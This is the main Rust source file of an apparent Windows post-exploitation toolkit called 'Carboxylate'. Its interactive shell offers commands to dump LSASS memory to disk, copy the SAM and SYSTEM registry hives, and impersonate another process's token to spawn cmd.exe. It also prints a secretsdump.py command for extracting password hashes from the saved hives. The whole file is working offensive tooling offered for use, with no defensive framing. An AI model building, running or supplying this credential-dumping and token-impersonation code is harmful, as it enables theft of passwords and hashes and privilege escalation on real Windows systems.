#[cfg(windows)]
mod lsass_dumper;
#[cfg(windows)]
mod sam_dumper;
#[cfg(windows)]
mod token_impersonator;

use std::io::{self, Write};

const BANNER: &str = r#"
   ____            _                      _       _
  / ___|__ _ _ __ | |__   _____  ___   _| | __ _| |_ ___
 | |   / _` | '_ \| '_ \ / _ \ \/ / | | | |/ _` | __/ _ \
 | |__| (_| | |  | | |_) | (_) >  <| |_| | | (_| | ||  __/
  \____\__,_|_|  |_|_.__/ \___/_/\_\\__, |_|\__,_|\__\___|
                                    |___/

  Windows Post-Exploitation Toolkit
  Type 'help' for available commands.
"#;

fn print_help() {
    println!();
    println!("  Commands:");
    println!("  -----------------------------------------");
    println!("  dumplsass          Dump LSASS process memory");
    println!("  dumpsam            Dump SAM & SYSTEM registry hives");
    println!("  impersonate        Impersonate a process token");
    println!("  help               Show this help menu");
    println!("  exit               Exit Carboxylate");
    println!();
}

#[cfg(windows)]
fn handle_lsass_dump() {
    if !lsass_dumper::is_elevated() {
        eprintln!("  [-] Not running with elevated privileges");
        return;
    }
    println!("  [+] Running with elevated privileges");

    if !lsass_dumper::enable_debug_privilege() {
        eprintln!("  [-] Failed to enable SeDebugPrivilege");
        return;
    }
    println!("  [+] SeDebugPrivilege enabled");

    let pid = match lsass_dumper::get_process_id_by_name("lsass.exe") {
        Some(p) => p,
        None => {
            eprintln!("  [-] Could not find lsass.exe");
            return;
        }
    };
    println!("  [+] Found lsass.exe (PID: {})", pid);

    if lsass_dumper::dump_to_file(pid, "lsass.dmp") {
        println!("  [+] LSASS dumped to lsass.dmp");
    } else {
        eprintln!("  [-] Failed to dump LSASS");
    }
}

#[cfg(windows)]
fn handle_sam_dump() {
    if !sam_dumper::is_elevated() {
        eprintln!("  [-] Not running with elevated privileges");
        return;
    }
    println!("  [+] Running with elevated privileges");

    if !sam_dumper::enable_backup_privilege() {
        eprintln!("  [-] Failed to enable SeBackupPrivilege");
        return;
    }
    println!("  [+] SeBackupPrivilege enabled");

    if sam_dumper::dump_sam_and_system("sam.save", "system.save") {
        println!("  [+] SAM hive saved to sam.save");
        println!("  [+] SYSTEM hive saved to system.save");
        println!("  [*] Extract hashes with:");
        println!("      secretsdump.py -sam sam.save -system system.save LOCAL");
    } else {
        eprintln!("  [-] SAM dump incomplete (check errors above)");
    }
}

#[cfg(windows)]
fn handle_token_impersonation() {
    if !token_impersonator::has_impersonate_privilege() {
        eprintln!("  [-] SeImpersonatePrivilege not available");
        return;
    }
    println!("  [+] SeImpersonatePrivilege is enabled\n");

    let processes = token_impersonator::enumerate_processes();

    println!("  PID\tOwner");
    println!("  ---\t-----");
    for proc in &processes {
        println!("  {}\t{}", proc.pid, proc.domain_user_name);
    }

    print!("\n  Enter PID to impersonate: ");
    io::stdout().flush().unwrap();

    let mut input = String::new();
    io::stdin().read_line(&mut input).unwrap();

    let target_pid: u32 = match input.trim().parse() {
        Ok(p) => p,
        Err(_) => {
            eprintln!("  [-] Invalid PID");
            return;
        }
    };

    match token_impersonator::impersonate_and_spawn(target_pid, "cmd.exe") {
        Some(spawned_pid) => println!("  [+] Spawned cmd.exe with PID: {}", spawned_pid),
        None => eprintln!("  [-] Failed to impersonate token"),
    }
}

#[cfg(not(windows))]
fn handle_lsass_dump() {
    eprintln!("  [-] LSASS dump is only supported on Windows");
}

#[cfg(not(windows))]
fn handle_sam_dump() {
    eprintln!("  [-] SAM dump is only supported on Windows");
}

#[cfg(not(windows))]
fn handle_token_impersonation() {
    eprintln!("  [-] Token impersonation is only supported on Windows");
}

fn run_command(cmd: &str) {
    match cmd {
        "dumplsass" => handle_lsass_dump(),
        "dumpsam" => handle_sam_dump(),
        "impersonate" => handle_token_impersonation(),
        "help" => print_help(),
        _ => println!("  [?] Unknown command. Type 'help' for options."),
    }
}

fn main() {
    let args: Vec<String> = std::env::args().collect();

    // One-shot mode
    if args.len() >= 2 {
        run_command(&args[1]);
        return;
    }

    // Interactive shell
    print!("{}", BANNER);

    let stdin = io::stdin();
    loop {
        print!("  Carboxylate > ");
        io::stdout().flush().unwrap();

        let mut input = String::new();
        if stdin.read_line(&mut input).unwrap() == 0 {
            break;
        }

        let cmd = input.trim();
        if cmd.is_empty() {
            continue;
        }

        if cmd == "exit" || cmd == "quit" {
            break;
        }

        run_command(cmd);
        println!();
    }
}
